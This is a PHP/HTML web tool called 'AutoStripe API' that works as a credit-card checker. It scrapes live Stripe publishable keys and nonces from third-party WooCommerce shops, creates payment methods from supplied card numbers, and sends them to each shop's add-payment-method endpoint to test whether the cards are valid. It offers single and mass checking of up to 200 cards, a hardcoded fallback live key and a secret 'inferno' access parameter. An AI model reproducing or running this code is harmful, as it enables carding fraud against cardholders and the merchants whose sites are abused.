<?php
/**
 * AutoStripe API - PHP Version
 * DEVELOPER: @diwazz
 */

error_reporting(0);
set_time_limit(0);

// --- BACKEND LOGIC ---

function get_stripe_key($domain) {
    $urls = [
        "https://$domain/my-account/add-payment-method/",
        "https://$domain/checkout/",
        "https://$domain/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        "https://$domain/?wc-ajax=get_stripe_params"
    ];
    
    $patterns = [
        '/pk_live_[a-zA-Z0-9_]+/',
        '/stripe_params[^}]*"key":"(pk_live_[^"]+)"/',
        '/wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"/',
        '/"publishableKey":"(pk_live_[^"]+)"/',
        '/var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]/'
    ];
    
    foreach ($urls as $url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        $res = curl_exec($ch);
        curl_close($ch);
        
        if ($res) {
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $res, $matches)) {
                    if (preg_match('/pk_live_[a-zA-Z0-9_]+/', $matches[0], $key)) return $key[0];
                }
            }
        }
    }
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN";
}

function extract_nonce($html) {
    $patterns = [
        '/createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']/',
        '/wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']/',
        '/name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']/',
        '/name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']/',
        '/var wc_stripe_params = [^}]*"nonce":"([^"]+)"/'
    ];
    foreach ($patterns as $p) if (preg_match($p, $html, $m)) return $m[1];
    return null;
}

function process_card($domain, $cc) {
    $parts = explode('|', $cc);
    if (count($parts) < 4) return ["Response" => "Invalid Format", "Status" => "Declined"];
    list($n, $mm, $yy, $cvc) = $parts;
    if (strlen($yy) == 4) $yy = substr($yy, 2);

    $stripe_key = get_stripe_key($domain);
    
    $ch = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card',
        'card[number]' => $n,
        'card[cvc]' => $cvc,
        'card[exp_year]' => $yy,
        'card[exp_month]' => $mm,
        'key' => $stripe_key
    ]));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (!isset($res['id'])) return ["Response" => $res['error']['message'] ?? "PM Error", "Status" => "Declined"];
    $pm_id = $res['id'];

    $ch = curl_init("https://$domain/my-account/add-payment-method/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    $html = curl_exec($ch);
    curl_close($ch);
    $nonce = extract_nonce($html);

    if (!$nonce) return ["Response" => "Nonce Error", "Status" => "Declined"];

    $ch = curl_init("https://$domain/?wc-ajax=wc_stripe_create_and_confirm_setup_intent");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'action' => 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method' => $pm_id,
        'wc-stripe-payment-type' => 'card',
        '_ajax_nonce' => $nonce
    ]));
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $final = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($final['success']) && $final['success']) return ["Response" => "Card Added Successfully", "Status" => "Approved"];
    return ["Response" => $final['data']['error']['message'] ?? "Declined", "Status" => "Declined"];
}

if (isset($_GET['key']) && $_GET['key'] == 'inferno') {
    header('Content-Type: application/json');
    echo json_encode(process_card($_GET['site'], $_GET['cc']));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AutoStripe API - DEVELOPER: @diwazz</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6a11cb;
            --secondary: #2575fc;
            --accent: #ff6b6b;
            --dark: #1a1a2e;
            --light: #f5f5f5;
            --success: #4caf50;
            --error: #f44336;
            --warning: #ff9800;
            --glass: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            min-height: 100vh;
            color: var(--light);
            overflow-x: hidden;
            position: relative;
        }
        
        .bg-animation {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden;
        }
        
        .bg-animation span {
            position: absolute; display: block; width: 20px; height: 20px;
            background: rgba(255, 255, 255, 0.2); animation: move 25s linear infinite; bottom: -150px;
        }
        
        .bg-animation span:nth-child(1) { left: 25%; width: 80px; height: 80px; animation-delay: 0s; }
        .bg-animation span:nth-child(2) { left: 10%; width: 20px; height: 20px; animation-delay: 2s; animation-duration: 12s; }
        .bg-animation span:nth-child(3) { left: 70%; width: 20px; height: 20px; animation-delay: 4s; }
        .bg-animation span:nth-child(4) { left: 40%; width: 60px; height: 60px; animation-delay: 0s; animation-duration: 18s; }
        .bg-animation span:nth-child(5) { left: 65%; width: 20px; height: 20px; animation-delay: 0s; }
        .bg-animation span:nth-child(6) { left: 75%; width: 110px; height: 110px; animation-delay: 3s; }
        .bg-animation span:nth-child(7) { left: 35%; width: 150px; height: 150px; animation-delay: 7s; }
        .bg-animation span:nth-child(8) { left: 50%; width: 25px; height: 25px; animation-delay: 15s; animation-duration: 45s; }
        .bg-animation span:nth-child(9) { left: 20%; width: 15px; height: 15px; animation-delay: 2s; animation-duration: 35s; }
        .bg-animation span:nth-child(10) { left: 85%; width: 150px; height: 150px; animation-delay: 0s; animation-duration: 11s; }
        
        @keyframes move {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; border-radius: 0; }
            100% { transform: translateY(-1000px) rotate(720deg); opacity: 0; border-radius: 50%; }
        }
        
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        
        header { text-align: center; padding: 40px 0; position: relative; }
        
        .logo {
            display: inline-block; font-size: 3rem; font-weight: 700; margin-bottom: 10px;
            background: linear-gradient(90deg, #fff, var(--accent));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px var(--primary); }
            to { text-shadow: 0 0 20px #fff, 0 0 30px var(--secondary), 0 0 40px var(--secondary); }
        }
        
        .tagline { font-size: 1.2rem; margin-bottom: 20px; opacity: 0.9; }
        .designer { font-size: 0.9rem; opacity: 0.7; margin-bottom: 30px; }
        
        .status-indicator {
            display: inline-block; width: 10px; height: 10px; border-radius: 50%;
            margin-right: 10px; animation: pulse 2s infinite;
        }
        .status-online { background-color: var(--success); }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); }
            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
        }
        
        .tabs { display: flex; justify-content: center; margin-bottom: 30px; flex-wrap: wrap; }
        
        .tab {
            padding: 12px 25px; margin: 0 10px 10px; background: var(--glass);
            backdrop-filter: blur(10px); border: 1px solid var(--glass-border);
            border-radius: 30px; cursor: pointer; transition: all 0.3s ease; font-weight: 500;
        }
        
        .tab:hover { background: rgba(255, 255, 255, 0.2); transform: translateY(-3px); }
        .tab.active { background: linear-gradient(90deg, var(--primary), var(--secondary)); border: 1px solid transparent; }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .glass-card {
            background: var(--glass); backdrop-filter: blur(10px); border-radius: 20px;
            padding: 30px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid var(--glass-border); margin-bottom: 30px;
        }
        
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
        
        .form-control {
            width: 100%; padding: 15px; border-radius: 10px; border: 1px solid var(--glass-border);
            background: rgba(255, 255, 255, 0.05); color: white; font-family: 'Poppins', sans-serif;
            transition: all 0.3s ease;
        }
        
        .form-control:focus { outline: none; border-color: var(--primary); background: rgba(255, 255, 255, 0.1); }
        
        textarea.form-control { min-height: 150px; resize: vertical; }
        
        .btn {
            display: inline-block; padding: 12px 25px; border-radius: 10px; border: none;
            cursor: pointer; font-weight: 600; transition: all 0.3s ease; margin-right: 10px;
            margin-bottom: 10px; font-family: 'Poppins', sans-serif;
        }
        
        .btn-primary { background: linear-gradient(90deg, var(--primary), var(--secondary)); color: white; }
        .btn-secondary { background: var(--glass); color: white; border: 1px solid var(--glass-border); }
        
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); }
        
        .result-container { margin-top: 30px; display: none; }
        .result-container.show { display: block; }
        
        .result-item {
            background: rgba(0, 0, 0, 0.2); padding: 15px; border-radius: 10px;
            margin-bottom: 10px; border-left: 4px solid var(--primary);
        }
        
        .result-item.success { border-left-color: var(--success); }
        .result-item.error { border-left-color: var(--error); }
        
        .progress-bar {
            width: 100%; height: 10px; background: var(--glass); border-radius: 5px;
            margin: 20px 0; overflow: hidden;
        }
        
        .progress-fill {
            height: 100%; background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%; transition: width 0.3s ease;
        }
        
        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; }
        .stat-item { text-align: center; }
        .stat-value { font-size: 1.5rem; font-weight: 700; }
        .stat-label { font-size: 0.8rem; opacity: 0.7; }
        
        footer { text-align: center; padding: 30px 0; margin-top: 50px; opacity: 0.7; }
    </style>
</head>
<body>
    <div class="bg-animation">
        <span></span><span></span><span></span><span></span><span></span>
        <span></span><span></span><span></span><span></span><span></span>
    </div>
    
    <div class="container">
        <header>
            <div class="logo">AutoStripe API</div>
            <div class="tagline">Advanced Stripe Payment Processing</div>
            <div class="designer">DEVELOPER: @diwazz | Telegram Bio Channel</div>
            <div><span class="status-indicator status-online"></span>API Status: Online</div>
        </header>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('single')">Single Checker</div>
            <div class="tab" onclick="switchTab('mass')">Mass Checker</div>
            <div class="tab" onclick="switchTab('api')">API Documentation</div>
        </div>
        
        <div id="single-tab" class="tab-content active">
            <div class="glass-card">
                <h3>Single Card Checker</h3>
                <div class="form-group">
                    <label for="single-site">Site Domain</label>
                    <input type="text" id="single-site" class="form-control" placeholder="example.com">
                </div>
                <div class="form-group">
                    <label for="single-cc">Card Details</label>
                    <input type="text" id="single-cc" class="form-control" placeholder="4242424242424242|12|25|123">
                </div>
                <button class="btn btn-primary" onclick="checkSingleCard()">Check Card</button>
                <button class="btn btn-secondary" onclick="clearSingleResults()">Clear</button>
                <div id="single-result" class="result-container">
                    <h4>Result:</h4>
                    <div id="single-result-content"></div>
                </div>
            </div>
        </div>
        
        <div id="mass-tab" class="tab-content">
            <div class="glass-card">
                <h3>Mass Card Checker (Max 200)</h3>
                <div class="form-group">
                    <label for="mass-site">Site Domain</label>
                    <input type="text" id="mass-site" class="form-control" placeholder="example.com">
                </div>
                <div class="form-group">
                    <label for="mass-cc">Card Details (One per line)</label>
                    <textarea id="mass-cc" class="form-control" placeholder="4242424242424242|12|25|123"></textarea>
                </div>
                <button class="btn btn-primary" onclick="checkMassCards()">Check Cards</button>
                <button class="btn btn-secondary" onclick="clearMassResults()">Clear</button>
                
                <div id="mass-progress" class="progress-bar" style="display:none;">
                    <div id="mass-progress-fill" class="progress-fill"></div>
                </div>
                
                <div id="mass-stats" class="stats" style="display:none;">
                    <div class="stat-item"><div id="mass-total" class="stat-value">0</div><div class="stat-label">Total</div></div>
                    <div class="stat-item"><div id="mass-approved" class="stat-value">0</div><div class="stat-label">Approved</div></div>
                    <div class="stat-item"><div id="mass-declined" class="stat-value">0</div><div class="stat-label">Declined</div></div>
                </div>
                
                <div id="mass-result" class="result-container">
                    <h4>Results:</h4>
                    <div id="mass-result-content"></div>
                </div>
            </div>
        </div>
        
        <div id="api-tab" class="tab-content">
            <div class="glass-card">
                <h3>API Documentation</h3>
                <div class="result-item">
                    <h4>Endpoint</h4>
                    <code>index.php?key=inferno&site=example.com&cc=NUMBER|MM|YY|CVV</code>
                </div>
            </div>
        </div>
        
        <footer>
            <p>&copy; 2026 AutoStripe API. DEVELOPER: @diwazz</p>
        </footer>
    </div>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tab + '-tab').classList.add('active');
        }

        function checkSingleCard() {
            const site = document.getElementById('single-site').value;
            const cc = document.getElementById('single-cc').value;
            const resContent = document.getElementById('single-result-content');
            const resContainer = document.getElementById('single-result');
            
            if(!site || !cc) return alert('Fill all fields');
            
            resContainer.classList.add('show');
            resContent.innerHTML = 'Checking...';
            
            fetch(`index.php?key=inferno&site=${site}&cc=${cc}`)
                .then(r => r.json())
                .then(data => {
                    resContent.innerHTML = `<div class="result-item ${data.Status === 'Approved' ? 'success' : 'error'}">
                        Status: ${data.Status}<br>Response: ${data.Response}
                    </div>`;
                });
        }

        function checkMassCards() {
            const site = document.getElementById('mass-site').value;
            const ccText = document.getElementById('mass-cc').value;
            const cards = ccText.split('\n').filter(c => c.trim());
            
            if(!site || cards.length === 0) return alert('Fill all fields');
            
            document.getElementById('mass-progress').style.display = 'block';
            document.getElementById('mass-stats').style.display = 'flex';
            document.getElementById('mass-result').classList.add('show');
            document.getElementById('mass-total').textContent = cards.length;
            
            let approved = 0, declined = 0, processed = 0;
            const resContent = document.getElementById('mass-result-content');
            resContent.innerHTML = '';

            cards.forEach(card => {
                fetch(`index.php?key=inferno&site=${site}&cc=${card}`)
                    .then(r => r.json())
                    .then(data => {
                        processed++;
                        if(data.Status === 'Approved') approved++; else declined++;
                        
                        document.getElementById('mass-approved').textContent = approved;
                        document.getElementById('mass-declined').textContent = declined;
                        document.getElementById('mass-progress-fill').style.width = (processed/cards.length*100) + '%';
                        
                        resContent.innerHTML += `<div class="result-item ${data.Status === 'Approved' ? 'success' : 'error'}">
                            Card: ${card}<br>Status: ${data.Status}
                        </div>`;
                    });
            });
        }

        function clearSingleResults() { document.getElementById('single-result').classList.remove('show'); }
        function clearMassResults() { document.getElementById('mass-result').classList.remove('show'); }
    </script>
</body>
</html>
